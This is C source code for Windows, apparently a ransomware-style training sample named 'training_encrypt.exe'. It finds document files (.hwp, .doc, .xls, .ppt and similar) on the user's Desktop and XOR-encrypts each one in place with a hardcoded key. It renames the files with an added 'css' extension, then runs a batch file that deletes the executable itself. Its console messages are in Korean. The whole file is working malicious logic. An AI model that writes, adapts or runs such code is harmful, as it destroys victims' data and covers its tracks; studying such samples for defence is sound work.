#include <stdio.h>
#include <io.h>
#include <Windows.h>
#include <string.h>

typedef struct _finddata_t FILE_SEARCH;
int key[8] = { 0x63, 0x72, 0xC0, 0x5B, 0x00, 0x2A, 0xDF, 0xCE };

int encrpyt(char *filename, char *filepath) {
	if (strstr(filename, ".hwp") || strstr(filename, ".ppt") || strstr(filename, ".pptx") || 
		strstr(filename, ".doc") || strstr(filename, ".docx") || strstr(filename, ".xls") || strstr(filename, ".xlsx")) {

		char filefullname[1000];
		sprintf_s(filefullname, sizeof(filefullname), "%s\\%s", filepath, filename);
		
		char data[1024];
		unsigned int read_size, i;
		long frpos, fwpos;
		FILE *fp;

		fopen_s(&fp, filefullname, "r+b");

		if (fp == NULL)
			return -1;
		while (!feof(fp))
		{
			fwpos = ftell(fp);
			read_size = fread(data, 1, 1024, fp);

			if (read_size == 0)break;
			for (i = 0; i < read_size; i++)
			{
				data[i] ^= key[i % 8];
			}

			frpos = ftell(fp);

			fseek(fp, fwpos, SEEK_SET);
			fwrite(data, 1, read_size, fp);

			fseek(fp, frpos, SEEK_SET);
		}
		fclose(fp);

		char o_name[1000];
		strcpy_s(o_name, sizeof(o_name), filefullname);

		char* identifier;
		char o_identifier[30] = "", n_name[500] = "";

		strtok_s(filefullname, ".", &identifier);
		

		sprintf_s(n_name, sizeof(n_name), "%s.%s%s", filefullname, "css", identifier);

		int n = rename(o_name, n_name);
		printf("%s -> %s ", o_name, n_name);
		printf("암호화 완료.\n");
		return 1;
	}
	return 0;
}

void delete_file()
{
	FILE *fp = NULL;

	char* del = "delete_file.bat";

	char* thisFile = "training_encrypt.exe";
	char szBatFile[256];

	fopen_s(&fp, del, "w");

	if (fp == NULL)
	{
		puts("생성 실패");
		return;
	}

	wsprintf(szBatFile,
		":Repeat      \r\n"
		"del /f /s /q %s    \r\n"
		"if exist \"%s\" goto Repeat \r\n"
		"del /s /q %s     \r\n",
		thisFile, thisFile, del);

	fwrite(szBatFile, strlen(szBatFile), 1, fp);
	fclose(fp);

	ShellExecute(NULL, "open", del, NULL, NULL, 0);
}

char* getDesktopFolderName()
{
	ULONG ulDataType;
	HKEY hKey;
	DWORD dwToRead = 100;

	static char strPath[100];
	char strKey[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders";

	RegOpenKeyEx(HKEY_CURRENT_USER, strKey, 0, KEY_READ, &hKey);
	RegQueryValueEx(hKey, "Desktop", NULL, &ulDataType, (LPBYTE)strPath, &dwToRead);
	strPath[dwToRead] = '\0';
	RegCloseKey(hKey);

	return strPath;
}

int main() {
	long h_file;
	char* path = getDesktopFolderName();
	char search_path[100];

	sprintf_s(search_path, sizeof(search_path), "%s\\*.*", path);
	
	FILE_SEARCH file_search;

	if ((h_file = _findfirst(search_path, &file_search)) == -1L) {
		printf("error");
	}
	else {
		do {
			encrpyt(file_search.name, path);
		} while (_findnext(h_file, &file_search) == 0);
	_findclose(h_file);
	}

	delete_file();
	return 0;
}

